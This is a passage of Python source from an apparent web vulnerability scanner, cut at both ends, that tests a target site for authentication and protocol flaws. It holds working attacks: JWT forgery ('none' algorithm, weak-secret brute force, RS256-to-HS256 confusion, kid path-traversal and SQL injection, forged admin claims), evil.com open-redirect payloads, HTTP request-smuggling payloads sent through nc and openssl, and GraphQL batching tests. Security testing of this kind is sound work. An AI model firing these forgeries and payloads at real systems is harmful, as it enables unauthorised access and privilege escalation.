        for endpoint in ["/api/login", "/api/auth", "/login", "/auth/login"]:
            login_url = urllib.parse.urljoin(url, endpoint)
            out, err, rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json", "-d", '{"username":"test","password":"test"}', login_url], timeout=10)
            if rc == 0 and out:
                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', out)
                if m:
                    sample_token = m.group(0)
                    break
    if not sample_token:
        out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", url], timeout=10)
        if rc == 0 and out:
            m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', out)
            if m:
                sample_token = m.group(0)
    if sample_token:
        try:
            parts = sample_token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                header['alg'] = 'none'
                header['typ'] = 'JWT'
                new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
                new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
                none_token = new_header.decode() + '.' + new_payload.decode() + '.'
                test_out, test_err, test_rc = await run(["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {none_token}", url], timeout=10)
                if test_rc == 0 and test_out and "401" not in test_out[:100] and "403" not in test_out[:100]:
                    results["vulnerable"] = True
                    results["issues"].append("none_algorithm")
                    results["evidence"].append({"type": "none_algorithm", "description": "JWT accepts 'none' algorithm"})
                try:
                    import jwt as pyjwt
                    weak_secrets = ['secret', 'password', '123456', 'key', 'jwt', 'token']
                    for secret in weak_secrets:
                        try:
                            pyjwt.decode(sample_token, secret, algorithms=['HS256'])
                            results["vulnerable"] = True
                            results["issues"].append("weak_secret")
                            results["evidence"].append({"type": "weak_secret", "secret": secret})
                            break
                        except Exception:
                            continue
                except Exception:
                    pass
        except Exception:
            pass
    return results


# =============================================================================
# ENHANCED JWT SECURITY TESTING
# =============================================================================

# Extended weak secrets list - loaded from wordlist or use defaults
JWT_WEAK_SECRETS_DEFAULT = [
    # Original 6
    'secret', 'password', '123456', 'key', 'jwt', 'token',
    # Common secrets
    'admin', 'test', 'hello', 'changeme', 'default', 'private',
    'public', 'mysecret', 'secretkey', 'privatekey', 'jwtkey',
    # Framework defaults
    'supersecret', 'supersecretkey', 'your-256-bit-secret',
    'your-secret-key', 'your_secret_key', 'auth_secret',
    # Development defaults
    'development', 'production', 'staging', 'local',
    'dev_secret', 'prod_secret', 'testing', 'debug',
    # Common patterns
    'qwerty', 'letmein', 'welcome', 'monkey', 'dragon',
    '12345678', '123456789', '1234567890', 'abcd1234',
    # Base64 encoded common secrets
    'c2VjcmV0', 'cGFzc3dvcmQ=', 'YWRtaW4=',  # secret, password, admin
    # Empty/null
    '', ' ', 'null', 'none', 'undefined',
    # JWT library examples
    'secret123', 'jwtsecret', 'secretjwt', 'jwt_secret',
    'jwt-secret', 'my_jwt_secret', 'my-jwt-secret',
    # HMAC common
    'hmac_secret', 'hmac-secret', 'hmacsecret', 'signing_key',
    'signing-key', 'signingkey', 'sign_key', 'signkey',
]


def _load_jwt_secrets_wordlist() -> list[str]:
    """Load JWT weak secrets from wordlist file if available."""
    wordlist_paths = [
        os.path.join(os.path.dirname(__file__), '..', 'payloads', 'jwt', 'weak-secrets.txt'),
        '/app/payloads/jwt/weak-secrets.txt',
    ]

    for path in wordlist_paths:
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    secrets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                    return secrets if secrets else JWT_WEAK_SECRETS_DEFAULT
            except Exception:
                pass

    return JWT_WEAK_SECRETS_DEFAULT


def _decode_jwt_parts(token: str) -> tuple[dict | None, dict | None, str | None]:
    """Decode JWT header and payload without verification."""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, None, None

        # Decode header
        header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))

        # Decode payload
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(payload_b64))

        return header, payload, parts[2]
    except Exception:
        return None, None, None


def _encode_jwt_parts(header: dict, payload: dict, signature: str = "") -> str:
    """Encode JWT parts into a token string."""
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
    return f"{header_b64}.{payload_b64}.{signature}"


async def jwt_algorithm_confusion_test(
    url: str,
    sample_token: str,
    jwks_url: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test RS256 to HS256 algorithm confusion vulnerability.

    When a server uses RS256 (asymmetric), an attacker may try to:
    1. Change the algorithm to HS256 (symmetric)
    2. Sign the token using the public key as the HMAC secret
    3. If server doesn't validate algorithm properly, it may accept the forged token
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}

    header, payload, _ = _decode_jwt_parts(sample_token)
    if not header or not payload:
        return results

    original_alg = header.get('alg', '').upper()

    # Only test if original algorithm is RS256/RS384/RS512/ES256/etc
    if not original_alg.startswith('RS') and not original_alg.startswith('ES') and not original_alg.startswith('PS'):
        return results

    # Try to discover JWKS URL
    if not jwks_url:
        for endpoint in ['/.well-known/jwks.json', '/jwks.json', '/.well-known/openid-configuration']:
            test_url = urllib.parse.urljoin(url, endpoint)
            out, err, rc = await run(["curl", "-sS", "-L", "-k", test_url], timeout=10)
            if rc == 0 and out:
                if endpoint.endswith('openid-configuration'):
                    try:
                        config = json.loads(out)
                        jwks_url = config.get('jwks_uri')
                        break
                    except Exception:
                        continue
                elif 'keys' in out:
                    jwks_url = test_url
                    break

    if not jwks_url:
        return results

    # Fetch JWKS and extract public key
    out, err, rc = await run(["curl", "-sS", "-L", "-k", jwks_url], timeout=10)
    if rc != 0 or not out:
        return results

    try:
        jwks = json.loads(out)
        keys = jwks.get('keys', [])

        for key in keys:
            if key.get('kty') != 'RSA':
                continue

            try:
                import jwt as pyjwt
                from jwt.algorithms import RSAAlgorithm
                from cryptography.hazmat.primitives import serialization

                # Convert JWK to PEM
                public_key_obj = RSAAlgorithm.from_jwk(json.dumps(key))
                public_key_str = public_key_obj.public_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PublicFormat.SubjectPublicKeyInfo
                ).decode()

                # Create HS256 token signed with public key as secret
                forged_token = pyjwt.encode(payload, public_key_str, algorithm='HS256')

                # Test the forged token
                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
                test_out, test_err, test_rc = await run(
                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                    timeout=10
                )

                if test_rc == 0 and test_out:
                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
                        results["vulnerable"] = True
                        results["issues"].append("algorithm_confusion")
                        results["evidence"].append({
                            "type": "algorithm_confusion",
                            "original_alg": original_alg,
                            "attack_alg": "HS256",
                            "description": f"Server accepted RS256->HS256 algorithm confusion attack",
                            "jwks_url": jwks_url,
                        })
                        break
            except Exception:
                continue

    except Exception:
        pass

    return results


async def jwt_kid_injection_test(
    url: str,
    sample_token: str,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test JWT kid (Key ID) header injection vulnerabilities.

    The 'kid' header parameter can be vulnerable to:
    1. Path traversal - read arbitrary files as key
    2. SQL injection - if kid is used in database query
    3. Command injection - if kid is passed to shell
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}

    header, payload, _ = _decode_jwt_parts(sample_token)
    if not header or not payload:
        return results

    # kid injection payloads
    kid_payloads = [
        # Path traversal to /dev/null (empty key)
        ("../../../../../../../dev/null", "", "path_traversal"),
        ("....//....//....//....//dev/null", "", "path_traversal_bypass"),
        ("/dev/null", "", "absolute_path"),
        # SQL injection payloads
        ("' UNION SELECT 'secret' -- ", "secret", "sqli_union"),
        ("1'; SELECT 'secret';--", "secret", "sqli_stacked"),
    ]

    try:
        import jwt as pyjwt

        for kid_payload, expected_secret, attack_type in kid_payloads:
            try:
                forged_token = pyjwt.encode(payload, expected_secret, algorithm='HS256', headers={'kid': kid_payload})

                auth_args = get_auth_curl_args(auth_session)  # Handles None internally
                test_out, test_err, test_rc = await run(
                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                    timeout=10
                )

                if test_rc == 0 and test_out:
                    if "401" not in test_out[:200] and "403" not in test_out[:200] and "unauthorized" not in test_out.lower()[:500]:
                        results["vulnerable"] = True
                        results["issues"].append(f"kid_{attack_type}")
                        results["evidence"].append({
                            "type": f"kid_{attack_type}",
                            "kid_payload": kid_payload,
                            "description": f"Server accepted JWT with injected kid: {kid_payload}",
                        })
            except Exception:
                continue

    except ImportError:
        pass

    return results


async def jwt_claim_manipulation_test(
    url: str,
    sample_token: str,
    known_secret: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test JWT claim manipulation vulnerabilities.

    If the JWT secret is weak/known, test if manipulated claims are accepted:
    1. Privilege escalation via role/admin claims
    2. User impersonation via sub/user_id claims
    3. Expiration bypass via exp claim
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}

    if not known_secret:
        return results

    header, payload, _ = _decode_jwt_parts(sample_token)
    if not header or not payload:
        return results

    try:
        import jwt as pyjwt

        # Privilege escalation claims to inject
        escalation_claims = [
            ({"role": "admin"}, "role_admin"),
            ({"admin": True}, "admin_true"),
            ({"is_admin": True}, "is_admin_true"),
            ({"isAdmin": True}, "isAdmin_true"),
            ({"roles": ["admin", "superuser"]}, "roles_array"),
            ({"permissions": ["*", "admin:*"]}, "permissions_wildcard"),
            ({"groups": ["administrators", "superusers"]}, "groups_admin"),
            ({"scope": "admin read write delete"}, "scope_admin"),
        ]

        auth_args = get_auth_curl_args(auth_session)  # Handles None internally

        # Get baseline response with original token
        baseline_out, _, baseline_rc = await run(
            ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {sample_token}"] + auth_args + [url],
            timeout=10
        )

        for claim_dict, claim_type in escalation_claims:
            try:
                modified_payload = payload.copy()
                modified_payload.update(claim_dict)

                alg = header.get('alg', 'HS256')
                if alg.upper() not in ['HS256', 'HS384', 'HS512']:
                    alg = 'HS256'

                forged_token = pyjwt.encode(modified_payload, known_secret, algorithm=alg)

                test_out, test_err, test_rc = await run(
                    ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                    timeout=10
                )

                if test_rc == 0 and test_out:
                    if "401" not in test_out[:200] and "403" not in test_out[:200]:
                        if baseline_out and test_out != baseline_out:
                            results["vulnerable"] = True
                            results["issues"].append(f"claim_manipulation_{claim_type}")
                            results["evidence"].append({
                                "type": "claim_manipulation",
                                "claim": claim_dict,
                                "claim_type": claim_type,
                                "description": f"Server accepted modified claims: {claim_dict}",
                            })
            except Exception:
                continue

        # Test expiration bypass
        try:
            modified_payload = payload.copy()
            modified_payload['exp'] = int(time.time()) + (365 * 24 * 60 * 60 * 10)  # 10 years
            modified_payload['iat'] = int(time.time())

            forged_token = pyjwt.encode(modified_payload, known_secret, algorithm='HS256')

            test_out, test_err, test_rc = await run(
                ["curl", "-sS", "-L", "-k", "-H", f"Authorization: Bearer {forged_token}"] + auth_args + [url],
                timeout=10
            )

            if test_rc == 0 and test_out and "401" not in test_out[:200] and "403" not in test_out[:200]:
                results["issues"].append("exp_manipulation")
                results["evidence"].append({
                    "type": "exp_manipulation",
                    "description": "Server accepts tokens with manipulated expiration",
                })
        except Exception:
            pass

        if results["issues"]:
            results["vulnerable"] = True

    except ImportError:
        pass

    return results


async def jwt_comprehensive_test(
    url: str,
    sample_token: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Run comprehensive JWT security tests.

    Combines all JWT vulnerability tests:
    1. None algorithm
    2. Weak secret brute-force (extended)
    3. Algorithm confusion (RS256->HS256)
    4. kid header injection
    5. Claim manipulation
    """
    results: dict[str, Any] = {
        "vulnerable": False,
        "issues": [],
        "evidence": [],
        "tests_run": [],
        "weak_secret_found": None,
    }

    # Try to discover token if not provided
    if not sample_token:
        for endpoint in ["/api/login", "/api/auth", "/login", "/auth/login", "/api/token"]:
            login_url = urllib.parse.urljoin(url, endpoint)
            out, err, rc = await run(
                ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
                 "-d", '{"username":"test","password":"test"}', login_url],
                timeout=10
            )
            if rc == 0 and out:
                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
                if m:
                    sample_token = m.group(0)
                    break

        if not sample_token:
            out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", url], timeout=10)
            if rc == 0 and out:
                m = re.search(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*', out)
                if m:
                    sample_token = m.group(0)

    if not sample_token:
        results["error"] = "No JWT token found"
        return results

    results["token_found"] = True

    header, payload, _ = _decode_jwt_parts(sample_token)
    if header:
        results["token_info"] = {
            "algorithm": header.get('alg'),
            "type": header.get('typ'),
            "has_kid": 'kid' in header,
        }

    # Test 1: None algorithm + basic weak secrets
    results["tests_run"].append("none_algorithm")
    basic_results = await jwt_vulnerability_test(url, sample_token)
    if basic_results.get("vulnerable"):
        results["vulnerable"] = True
        results["issues"].extend(basic_results.get("issues", []))
        results["evidence"].extend(basic_results.get("evidence", []))

        for ev in basic_results.get("evidence", []):
            if ev.get("type") == "weak_secret":
                results["weak_secret_found"] = ev.get("secret")

    # Test 2: Extended weak secret brute-force
    if not results["weak_secret_found"]:
        results["tests_run"].append("weak_secret_extended")
        secrets_to_test = _load_jwt_secrets_wordlist()

        try:
            import jwt as pyjwt

            for secret in secrets_to_test:
                if secret in ['secret', 'password', '123456', 'key', 'jwt', 'token']:
                    continue
                try:
                    pyjwt.decode(sample_token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    results["vulnerable"] = True
                    results["issues"].append("weak_secret")
                    results["evidence"].append({"type": "weak_secret", "secret": secret})
                    results["weak_secret_found"] = secret
                    break
                except Exception:
                    continue
        except ImportError:
            pass

    # Test 3: Algorithm confusion
    if header and header.get('alg', '').upper().startswith(('RS', 'ES', 'PS')):
        results["tests_run"].append("algorithm_confusion")
        confusion_results = await jwt_algorithm_confusion_test(url, sample_token, auth_session=auth_session)
        if confusion_results.get("vulnerable"):
            results["vulnerable"] = True
            results["issues"].extend(confusion_results.get("issues", []))
            results["evidence"].extend(confusion_results.get("evidence", []))

    # Test 4: kid header injection
    if header and 'kid' in header:
        results["tests_run"].append("kid_injection")
        kid_results = await jwt_kid_injection_test(url, sample_token, auth_session=auth_session)
        if kid_results.get("vulnerable"):
            results["vulnerable"] = True
            results["issues"].extend(kid_results.get("issues", []))
            results["evidence"].extend(kid_results.get("evidence", []))

    # Test 5: Claim manipulation
    if results["weak_secret_found"]:
        results["tests_run"].append("claim_manipulation")
        claim_results = await jwt_claim_manipulation_test(
            url, sample_token,
            known_secret=results["weak_secret_found"],
            auth_session=auth_session
        )
        if claim_results.get("vulnerable"):
            results["vulnerable"] = True
            results["issues"].extend(claim_results.get("issues", []))
            results["evidence"].extend(claim_results.get("evidence", []))

    return results


async def oauth_vulnerability_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": [], "oidc": None}
    for endpoint in ["/oauth/callback", "/auth/callback", "/signin-oidc", "/callback"]:
        callback_url = urllib.parse.urljoin(url, endpoint)
        for payload in ["https://evil.com", "//evil.com", "////evil.com", "https:evil.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]:
            test_url = f"{callback_url}?redirect_uri={urllib.parse.quote(payload)}"
            out, err, rc = await run(["curl", "-sS", "-I", "-L", "-k", "--max-redirs", "0", test_url], timeout=10)
            if rc == 0 and out and ("Location: " + payload in out or f"Location: {payload}" in out):
                results["vulnerable"] = True
                results["issues"].append("open_redirect")
                results["evidence"].append({"type": "open_redirect", "endpoint": endpoint, "payload": payload})
                break

    # OIDC configuration checks (discovery + JWKS analysis)
    if oidc_discover:
        oidc_config = await oidc_discover(url)
        if oidc_config:
            results["oidc"] = {
                "issuer": oidc_config.issuer,
                "authorization_endpoint": oidc_config.authorization_endpoint,
                "token_endpoint": oidc_config.token_endpoint,
                "jwks_uri": oidc_config.jwks_uri,
                "response_types_supported": oidc_config.response_types_supported,
                "grant_types_supported": oidc_config.grant_types_supported,
                "token_endpoint_auth_methods_supported": oidc_config.token_endpoint_auth_methods_supported,
                "code_challenge_methods_supported": oidc_config.code_challenge_methods_supported,
                "id_token_signing_alg_values_supported": oidc_config.id_token_signing_alg_values_supported,
            }

            # Insecure issuer scheme
            if oidc_config.issuer and oidc_config.issuer.lower().startswith("http://"):
                results["vulnerable"] = True
                results["issues"].append("issuer_insecure")
                results["evidence"].append({
                    "type": "issuer_insecure",
                    "issuer": oidc_config.issuer,
                    "detail": "OIDC issuer uses HTTP (should be HTTPS)",
                })

            # id_token alg none
            id_token_algs = [a.lower() for a in (oidc_config.id_token_signing_alg_values_supported or [])]
            if "none" in id_token_algs:
                results["vulnerable"] = True
                results["issues"].append("id_token_alg_none")
                results["evidence"].append({
                    "type": "id_token_alg_none",
                    "detail": "OIDC advertises id_token signing alg 'none'",
                })

            # Implicit flow enabled
            resp_types = [r.lower() for r in (oidc_config.response_types_supported or [])]
            if any("token" in r for r in resp_types) or any("id_token" in r for r in resp_types):
                results["vulnerable"] = True
                results["issues"].append("implicit_flow_enabled")
                results["evidence"].append({
                    "type": "implicit_flow_enabled",
                    "response_types": oidc_config.response_types_supported,
                    "detail": "Implicit or hybrid flows enabled",
                })

            # Resource Owner Password grant enabled
            grants = [g.lower() for g in (oidc_config.grant_types_supported or [])]
            if "password" in grants:
                results["vulnerable"] = True
                results["issues"].append("ropc_enabled")
                results["evidence"].append({
                    "type": "ropc_enabled",
                    "grant_types": oidc_config.grant_types_supported,
                    "detail": "Resource Owner Password Credentials grant enabled",
                })

            # PKCE missing or lacks S256
            pkce_methods = [m.lower() for m in (oidc_config.code_challenge_methods_supported or [])]
            if pkce_methods and "s256" not in pkce_methods:
                results["vulnerable"] = True
                results["issues"].append("pkce_s256_missing")
                results["evidence"].append({
                    "type": "pkce_s256_missing",
                    "methods": oidc_config.code_challenge_methods_supported,
                    "detail": "PKCE does not advertise S256 support",
                })
            elif not pkce_methods:
                results["issues"].append("pkce_not_advertised")
                results["evidence"].append({
                    "type": "pkce_not_advertised",
                    "detail": "PKCE methods not advertised in OIDC discovery",
                })

            # Token endpoint auth method "none" advertised
            auth_methods = [m.lower() for m in (oidc_config.token_endpoint_auth_methods_supported or [])]
            if "none" in auth_methods:
                results["issues"].append("token_endpoint_auth_none")
                results["evidence"].append({
                    "type": "token_endpoint_auth_none",
                    "methods": oidc_config.token_endpoint_auth_methods_supported,
                    "detail": "Token endpoint supports public clients (auth method none)",
                })

            # JWKS inspection for weak/symmetric keys
            if oidc_config.jwks_uri:
                jwks_out, _, jwks_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "8", oidc_config.jwks_uri], timeout=10)
                if jwks_rc == 0 and jwks_out:
                    try:
                        jwks = json.loads(jwks_out)
                        keys = jwks.get("keys", []) if isinstance(jwks, dict) else []
                        for key in keys:
                            kty = (key.get("kty") or "").lower()
                            alg = (key.get("alg") or "").lower()
                            if kty == "oct":
                                results["vulnerable"] = True
                                results["issues"].append("jwks_symmetric_key")
                                results["evidence"].append({
                                    "type": "jwks_symmetric_key",
                                    "detail": "JWKS exposes symmetric (oct) key",
                                })
                            if alg == "none":
                                results["vulnerable"] = True
                                results["issues"].append("jwks_alg_none")
                                results["evidence"].append({
                                    "type": "jwks_alg_none",
                                    "detail": "JWKS advertises alg none",
                                })
                            if kty == "rsa" and key.get("n"):
                                try:
                                    n_b64 = key.get("n")
                                    padding = "=" * (-len(n_b64) % 4)
                                    n_bytes = base64.urlsafe_b64decode(n_b64 + padding)
                                    key_bits = len(n_bytes) * 8
                                    if key_bits and key_bits < 2048:
                                        results["vulnerable"] = True
                                        results["issues"].append("jwks_weak_rsa")
                                        results["evidence"].append({
                                            "type": "jwks_weak_rsa",
                                            "key_size": key_bits,
                                            "detail": "JWKS RSA key size below 2048 bits",
                                        })
                                except Exception:
                                    pass
                    except Exception:
                        pass
    return results


async def session_vulnerability_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
    test_session_id = "FIXED" + ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    # Use a per-call tempfile cookie jar so concurrent worker scans on the same
    # host don't clobber each other's cookies (and so we don't leak captured
    # cookies from one target into another's evidence).
    cookie_fd, cookie_jar = tempfile.mkstemp(prefix="shakerscan-cookies-", suffix=".txt")
    os.close(cookie_fd)
    try:
        await run(["curl", "-sS", "-L", "-k", "-c", cookie_jar, "-H", f"Cookie: PHPSESSID={test_session_id}; JSESSIONID={test_session_id}", url], timeout=10)
        out2, err2, rc2 = await run(["curl", "-sS", "-I", "-L", "-k", "-b", cookie_jar, url], timeout=10)
        if rc2 == 0 and out2 and test_session_id in out2:
            results["vulnerable"] = True
            results["issues"].append("session_fixation")
            results["evidence"].append({"type": "session_fixation", "description": "Application accepts externally set session IDs"})
    finally:
        try:
            os.unlink(cookie_jar)
        except OSError:
            pass
    return results


async def timing_attack_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "evidence": []}
    for endpoint in ["/api/login", "/login", "/api/auth", "/authenticate"]:
        auth_url = urllib.parse.urljoin(url, endpoint)
        timings: list[tuple] = []
        for _ in range(5):
            start = time.time(); await run(["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json", "-d", '{"username":"admin","password":"wrongpass"}', auth_url], timeout=10); timings.append(("valid", time.time() - start))
        for _ in range(5):
            start = time.time(); await run(["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json", "-d", '{"username":"nonexistentuser123456","password":"wrongpass"}', auth_url], timeout=10); timings.append(("invalid", time.time() - start))
        valid_times = [t for tag, t in timings if tag == "valid"]
        invalid_times = [t for tag, t in timings if tag == "invalid"]
        if valid_times and invalid_times:
            avg_valid = sum(valid_times) / len(valid_times); avg_invalid = sum(invalid_times) / len(invalid_times)
            import statistics
            std_valid = statistics.stdev(valid_times) if len(valid_times) > 1 else 0
            std_invalid = statistics.stdev(invalid_times) if len(invalid_times) > 1 else 0
            diff = abs(avg_valid - avg_invalid)
            if diff > 0.2 and diff > (std_valid + std_invalid) * 2:
                results["vulnerable"] = True
                results["evidence"].append({"endpoint": endpoint, "avg_valid_time": avg_valid, "avg_invalid_time": avg_invalid, "difference": diff})
    return results


async def http_smuggling_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "technique": None, "evidence": []}
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname; port = parsed.port or (443 if parsed.scheme == "https" else 80); path = parsed.path or "/"
    cl_te_payload = (f"POST {path} HTTP/1.1\r\n" f"Host: {host}\r\n" "Content-Type: application/x-www-form-urlencoded\r\n" "Content-Length: 4\r\n" "Transfer-Encoding: chunked\r\n" "\r\n" "5c\r\n" "GPOST / HTTP/1.1\r\n" "Content-Type: application/x-www-form-urlencoded\r\n" "Content-Length: 15\r\n" "\r\n" "x=1\r\n" "0\r\n" "\r\n")
    te_cl_payload = (f"POST {path} HTTP/1.1\r\n" f"Host: {host}\r\n" "Content-Type: application/x-www-form-urlencoded\r\n" "Transfer-Encoding: chunked\r\n" "Content-Length: 3\r\n" "\r\n" "5\r\n" "GPOST\r\n" "0\r\n" "\r\n")
    if parsed.scheme == "https":
        out, err, rc = await run(["openssl", "s_client", "-connect", f"{host}:{port}", "-servername", host, "-quiet"], timeout=10, input_text=cl_te_payload)
    else:
        out, err, rc = await run(["nc", host, str(port)], timeout=10, input_text=cl_te_payload)
    if rc == 0 and out and ("GPOST" in out or "400" not in out[:20]):
        results["vulnerable"] = True; results["technique"] = "CL.TE"; results["evidence"].append({"technique": "CL.TE", "response_snippet": out[:500]})
    if not results["vulnerable"]:
        if parsed.scheme == "https":
            out, err, rc = await run(["openssl", "s_client", "-connect", f"{host}:{port}", "-servername", host, "-quiet"], timeout=10, input_text=te_cl_payload)
        else:
            out, err, rc = await run(["nc", host, str(port)], timeout=10, input_text=te_cl_payload)
        if rc == 0 and out and ("GPOST" in out or "400" not in out[:20]):
            results["vulnerable"] = True; results["technique"] = "TE.CL"; results["evidence"].append({"technique": "TE.CL", "response_snippet": out[:500]})
    return results


async def graphql_vulnerability_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
    for endpoint in ["/graphql", "/graphql/v2", "/api/graphql", "/query"]:
        graphql_url = urllib.parse.urljoin(url, endpoint)
        introspection_query = {"query": "{ __schema { types { name } } }"}
        out, err, rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json", "-d", json.dumps(introspection_query), graphql_url], timeout=10)
        if rc == 0 and out:
            try:
                response = json.loads(out)
                if "data" in response and "__schema" in response.get("data", {}):
                    schema_types = response.get("data", {}).get("__schema", {}).get("types", [])
                    response_hash = hashlib.sha256(out.encode("utf-8", errors="ignore")).hexdigest()[:16]
                    results["vulnerable"] = True
                    if "introspection_enabled" not in results["issues"]:
                        results["issues"].append("introspection_enabled")
                    results["evidence"].append({
                        "type": "introspection_enabled",
                        "endpoint": endpoint,
                        "verified": True,
                        "schema_type_count": len(schema_types) if isinstance(schema_types, list) else None,
                        "response_hash16": response_hash,
                    })
            except Exception:
                pass
    return results


# =============================================================================
# ENHANCED GRAPHQL SECURITY TESTING
# =============================================================================

GRAPHQL_ENDPOINTS = ["/graphql", "/graphql/v2", "/api/graphql", "/query", "/gql", "/api/gql"]


async def _find_graphql_endpoint(url: str, auth_session: Any = None) -> str | None:
    """Find a working GraphQL endpoint by testing common paths."""
    auth_args = get_auth_curl_args(auth_session)  # Handles None internally

    for endpoint in GRAPHQL_ENDPOINTS:
        graphql_url = urllib.parse.urljoin(url, endpoint)
        test_query = {"query": "{ __typename }"}
        out, err, rc = await run(
            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
             "-d", json.dumps(test_query)] + auth_args + [graphql_url],
            timeout=10
        )
        if rc == 0 and out:
            try:
                response = json.loads(out)
                if "data" in response or "errors" in response:
                    return graphql_url
            except Exception:
                continue
    return None


async def graphql_batch_attack_test(
    url: str,
    graphql_url: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test GraphQL batching vulnerabilities.

    GraphQL servers may accept arrays of queries, allowing:
    1. Batch brute-force attacks (multiple login attempts in one request)
    2. Rate limit bypass (100 queries counted as 1 request)
    3. Resource exhaustion (many expensive queries at once)

    Args:
        url: Base URL
        graphql_url: GraphQL endpoint (auto-discovered if not provided)
        auth_session: AuthSession for authenticated testing

    Returns:
        Dict with vulnerability findings
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}

    if not graphql_url:
        graphql_url = await _find_graphql_endpoint(url, auth_session)
        if not graphql_url:
            return results

    auth_args = get_auth_curl_args(auth_session)  # Handles None internally

    # Test 1: Array batching (multiple queries in array)
    batch_queries = [
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
        {"query": "{ __typename }"},
    ]

    out, err, rc = await run(
        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
         "-d", json.dumps(batch_queries)] + auth_args + [graphql_url],
        timeout=15
    )

    if rc == 0 and out:
        try:
            response = json.loads(out)
            # If response is an array with multiple results, batching is supported
            if isinstance(response, list) and len(response) >= 5:
                results["vulnerable"] = True
                results["issues"].append("batch_queries_allowed")
                results["evidence"].append({
                    "type": "batch_queries_allowed",
                    "endpoint": graphql_url,
                    "batch_size_tested": len(batch_queries),
                    "responses_received": len(response),
                    "description": "GraphQL server accepts batched queries (array format)",
                    "risk": "Rate limit bypass, brute-force amplification",
                })
        except Exception:
            pass

    # Test 2: Large batch (test if there's a limit)
    large_batch = [{"query": "{ __typename }"} for _ in range(50)]

    out, err, rc = await run(
        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
         "-d", json.dumps(large_batch)] + auth_args + [graphql_url],
        timeout=30
    )

    if rc == 0 and out:
        try:
            response = json.loads(out)
            if isinstance(response, list) and len(response) >= 50:
                results["issues"].append("no_batch_limit")
                results["evidence"].append({
                    "type": "no_batch_limit",
                    "endpoint": graphql_url,
                    "batch_size_tested": 50,
                    "responses_received": len(response),
                    "description": "No apparent batch query limit (50+ queries accepted)",
                    "risk": "DoS via query batching",
                })
        except Exception:
            pass

    # Test 3: Aliased batch (multiple operations in single query using aliases)
    alias_query = """
    query {
        a1: __typename
        a2: __typename
        a3: __typename
        a4: __typename
        a5: __typename
        a6: __typename
        a7: __typename
        a8: __typename
        a9: __typename
        a10: __typename
    }
    """

    out, err, rc = await run(
        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
         "-d", json.dumps({"query": alias_query})] + auth_args + [graphql_url],
        timeout=15
    )

    if rc == 0 and out:
        try:
            response = json.loads(out)
            data = response.get("data", {})
